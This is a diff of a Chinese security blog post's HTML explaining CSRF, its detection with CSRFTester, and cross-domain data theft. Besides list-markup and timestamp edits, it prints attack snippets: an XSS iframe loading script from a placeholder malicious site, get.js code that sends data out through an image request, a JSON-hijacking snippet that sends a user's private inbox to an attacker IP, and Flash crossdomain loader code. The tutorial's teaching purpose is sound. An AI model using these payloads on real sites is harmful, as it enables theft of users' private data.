@@ -55,18 +55,18 @@
   };
 </script>
 
-  <meta name="description" content="一、CSRF理解 CSRF/XSRF跨站点请求伪造(Cross—Site Request Forgery)，也被称为：one click attack/session riding。跟XSS攻击一样，存在巨大的危害性，可以这样来理解：   攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号">
+  <meta name="description" content="一、CSRF理解 CSRF/XSRF跨站点请求伪造(Cross—Site Request Forgery)，也被称为：one click attack/session riding。跟XSS攻击一样，存在巨大的危害性，可以这样来理解：  攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，">
 <meta name="keywords" content="CSRF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Web安全—CSRF基础及利用">
 <meta property="og:url" content="https://github.com/xx-C1/xx-C1.github.io/2018/07/10/Web安全—CSRF基础及利用/index.html">
 <meta property="og:site_name" content="xxC1&#39;s blog">
-<meta property="og:description" content="一、CSRF理解 CSRF/XSRF跨站点请求伪造(Cross—Site Request Forgery)，也被称为：one click attack/session riding。跟XSS攻击一样，存在巨大的危害性，可以这样来理解：   攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号">
+<meta property="og:description" content="一、CSRF理解 CSRF/XSRF跨站点请求伪造(Cross—Site Request Forgery)，也被称为：one click attack/session riding。跟XSS攻击一样，存在巨大的危害性，可以这样来理解：  攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2021-01-18T08:57:05.747Z">
+<meta property="og:updated_time" content="2021-01-19T05:09:25.459Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Web安全—CSRF基础及利用">
-<meta name="twitter:description" content="一、CSRF理解 CSRF/XSRF跨站点请求伪造(Cross—Site Request Forgery)，也被称为：one click attack/session riding。跟XSS攻击一样，存在巨大的危害性，可以这样来理解：   攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号">
+<meta name="twitter:description" content="一、CSRF理解 CSRF/XSRF跨站点请求伪造(Cross—Site Request Forgery)，也被称为：one click attack/session riding。跟XSS攻击一样，存在巨大的危害性，可以这样来理解：  攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，">
   <link rel="canonical" href="https://github.com/xx-C1/xx-C1.github.io/2018/07/10/Web安全—CSRF基础及利用/">
 
 
@@ -294,7 +294,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-01-18 16:57:05" itemprop="dateModified" datetime="2021-01-18T16:57:05+08:00">2021-01-18</time>
+                <time title="修改时间：2021-01-19 13:09:25" itemprop="dateModified" datetime="2021-01-19T13:09:25+08:00">2021-01-19</time>
               </span>
             
           
@@ -368,16 +368,14 @@
       
         <h3 id="一、CSRF理解"><a href="#一、CSRF理解" class="headerlink" title="一、CSRF理解"></a>一、CSRF理解</h3><ul>
 <li><p><strong>CSRF/XSRF跨站点请求伪造(Cross—Site Request Forgery)，也被称为：one click attack/session riding。跟XSS攻击一样，存在巨大的危害性，可以这样来理解：</strong></p>
-</li>
-<li><ul>
+<ul>
 <li>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 </li>
 </ul>
 </li>
 </ul><a id="more"></a>
 <h3 id="二、CSRF攻击原理及过程"><a href="#二、CSRF攻击原理及过程" class="headerlink" title="二、CSRF攻击原理及过程"></a>二、CSRF攻击原理及过程</h3><ul>
 <li><p><strong>如下：</strong></p>
-</li>
-<li><ul>
+<ul>
 <li>其中Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。</li>
 </ul>
 </li>
@@ -416,8 +414,7 @@
 </ul>
 <h3 id="三、CSRF攻击获取数据的方法"><a href="#三、CSRF攻击获取数据的方法" class="headerlink" title="三、CSRF攻击获取数据的方法"></a>三、CSRF攻击获取数据的方法</h3><ul>
 <li><p><strong>要获取的关键数据：</strong></p>
-</li>
-<li><ul>
+<ul>
 <li><strong>用户 id</strong></li>
 <li><strong>用户昵称</strong></li>
 <li><strong>用户 email</strong></li>
@@ -429,33 +426,27 @@
 <h4 id="（一）同域内"><a href="#（一）同域内" class="headerlink" title="（一）同域内"></a>（一）同域内</h4><ul>
 <li><strong>CSRF攻击获取数据几乎没有任何限制</strong></li>
 </ul>
-<h4 id="（二）跨域"><a href="#（二）跨域" class="headerlink" title="（二）跨域"></a>（二）跨域</h4><ul>
-<li><p><strong>CSRF 攻击获取数据的几种方法总结：</strong></p>
-</li>
-<li><ul>
-<li><strong>1、XSS</strong> </li>
-</ul>
-</li>
-<li><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">如之前关于XSS文章做的三方的演示，使用目标站点上的XSS漏洞：</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span> <span class="attr">src</span>=<span class="string">‘http://目标站点/search.php?k</span>=<span class="string">“</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://恶意站点/get.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>’&gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">其中get.js 的代码为：</span><br><span class="line">//use DOM method to get your data</span><br><span class="line">new Image(). src=‘http://恶意站点/a.php?data=‘+data;</span><br><span class="line"></span><br><span class="line">恶意站点的 a.php 文件接收唯一标识等数据，该唯一标识可以是 url 中的或是目标站点url 对应的内容中的。这样受害者就会访问到第三方的恶意网站从而泄露信息。</span><br></pre></td></tr></table></figure>
-</li>
-<li><ul>
+<h4 id="（二）跨域"><a href="#（二）跨域" class="headerlink" title="（二）跨域"></a>（二）跨域</h4><p>  <strong>CSRF 攻击获取数据的几种方法总结：</strong></p>
+<ul>
+<li><p><strong>1、XSS</strong> </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">如之前关于XSS文章做的三方的演示，使用目标站点上的XSS漏洞：</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">0</span> <span class="attr">height</span>=<span class="string">0</span> <span class="attr">src</span>=<span class="string">‘http://目标站点/search.php?k</span>=<span class="string">“</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://恶意站点/get.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>’&gt;<span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">其中get.js 的代码为：</span><br><span class="line">//use DOM method to get your data</span><br><span class="line">new Image(). src=‘http://恶意站点/a.php?data=‘+data;</span><br><span class="line"></span><br><span class="line">恶意站点的 a.php 文件接收唯一标识等数据，该唯一标识可以是 url 中的或是目标站点url 对应的内容中的。这样受害者就会访问到第三方的恶意网站从而泄露信息。</span><br></pre></td></tr></table></figure>
+
+<ul>
 <li><strong>2、服务端代理技术</strong></li>
 </ul>
 </li>
-<li></li>
-<li><ul>
-<li><strong>3、JSON Hijacing</strong></li>
 </ul>
+<ul>
+<li><p><strong>3、JSON Hijacing</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">目标站点使用了 JSON 数据传输用户私有数据，其中包含需要的唯一标识等信息。</span><br><span class="line"></span><br><span class="line">相关代码：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">hijack</span><span class="params">(o)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="comment">//use DOM method to get your data</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Image().src=<span class="string">"http://192.168.1.2/JSONHiJack.asp?hi="</span>+<span class="built_in">escape</span>(data);</span></span><br><span class="line">&#125;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://api.fanfou.com/private_messages/inbox.json?callback</span>=<span class="string">hijack&amp;count</span>=<span class="string">2</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 </li>
-<li><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">目标站点使用了 JSON 数据传输用户私有数据，其中包含需要的唯一标识等信息。</span><br><span class="line"></span><br><span class="line">相关代码：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">hijack</span><span class="params">(o)</span></span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="comment">//use DOM method to get your data</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Image().src=<span class="string">"http://192.168.1.2/JSONHiJack.asp?hi="</span>+<span class="built_in">escape</span>(data);</span></span><br><span class="line">&#125;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://api.fanfou.com/private_messages/inbox.json?callback</span>=<span class="string">hijack&amp;count</span>=<span class="string">2</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<li><p><strong>4、Flash AsctionScript（crossdomain.xml）</strong></p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">前提是目标站点下存在crossdomain.xml文件，且其配置允许其他域的AS脚本进行跨域请求。</span></span><br><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">cross-domain-policy</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"*"</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">cross-domain-policy</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">相关代码：</span></span><br><span class="line"><span class="xml">import flash.net.*; </span></span><br><span class="line"><span class="xml">var _l = new URLLoader(new URLRequest(“http://目标站点/"));</span></span><br><span class="line"><span class="xml">_l.addEventListener(Event.COMPLETE,function()</span><span class="template-variable">&#123;text1.text = _l.data&#125;</span><span class="xml">);</span></span><br><span class="line"><span class="xml">_l.load();</span></span><br></pre></td></tr></table></figure>
+
+
+
+
 </li>
-<li><ul>
-<li><strong>4、Flash AsctionScript（crossdomain.xml）</strong></li>
-</ul>
-</li>
-<li><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">前提是目标站点下存在crossdomain.xml文件，且其配置允许其他域的AS脚本进行跨域请求。</span></span><br><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">cross-domain-policy</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">allow-access-from</span> <span class="attr">domain</span>=<span class="string">"*"</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">cross-domain-policy</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">相关代码：</span></span><br><span class="line"><span class="xml">import flash.net.*; </span></span><br><span class="line"><span class="xml">var _l = new URLLoader(new URLRequest(“http://目标站点/"));</span></span><br><span class="line"><span class="xml">_l.addEventListener(Event.COMPLETE,function()</span><span class="template-variable">&#123;text1.text = _l.data&#125;</span><span class="xml">);</span></span><br><span class="line"><span class="xml">_l.load();</span></span><br></pre></td></tr></table></figure>
-</li>
-<li></li>
 </ul>
 <h3 id="四、检测方法"><a href="#四、检测方法" class="headerlink" title="四、检测方法"></a>四、检测方法</h3><ul>
 <li><p>最简单的方法就是抓取一个正常请求的数据包，去掉 Referer 字段后再重新提交，如果该提交还有效，那么基本上可以确定存在 CSRF 漏洞。</p>
@@ -465,8 +456,7 @@
 </ul>
 <h4 id="以-CSRFTester-工具为例"><a href="#以-CSRFTester-工具为例" class="headerlink" title="以 CSRFTester 工具为例"></a>以 <strong>CSRFTester</strong> 工具为例</h4><ul>
 <li><p><strong>使用 CSRFTester 进行测试时：</strong></p>
-</li>
-<li><ul>
+<ul>
 <li>1.抓取我们在浏览器中访问过的所有链接以及所有的表单等信息</li>
 <li>2.通过在 CSRFTester 中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。</li>
 <li>3.如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF 漏洞。</li>
@@ -478,11 +468,11 @@
 <h3 id="五、CSRF利用"><a href="#五、CSRF利用" class="headerlink" title="五、CSRF利用"></a>五、CSRF利用</h3><ul>
 <li><p><strong>攻击者发现CSRF漏洞——构造代码——发送给受害人——受害人打开——受害人执行代码——完成攻击</strong></p>
 </li>
-<li><p><strong>相比于XSS少一个获取cookie的步骤。</strong></p>
+<li><p>相比于XSS少一个获取cookie的步骤。</p>
 </li>
-<li><p><strong>思路：诱使管理员打开构造的代码！</strong></p>
+<li><p>思路：诱使管理员打开构造的代码！</p>
 </li>
-<li><p><strong>CSRF出现的地方通常在权限控制的地方 如会员中心、后台管理、用户注册、发布帖子、用户后台处、交易管理处这几个地方</strong></p>
+<li><p>CSRF出现的地方通常在权限控制的地方 如会员中心、后台管理、用户注册、发布帖子、用户后台处、交易管理处这几个地方</p>
 </li>
 </ul>
 <h4 id="（一）GET类型CSRF"><a href="#（一）GET类型CSRF" class="headerlink" title="（一）GET类型CSRF"></a>（一）GET类型CSRF</h4><ul>
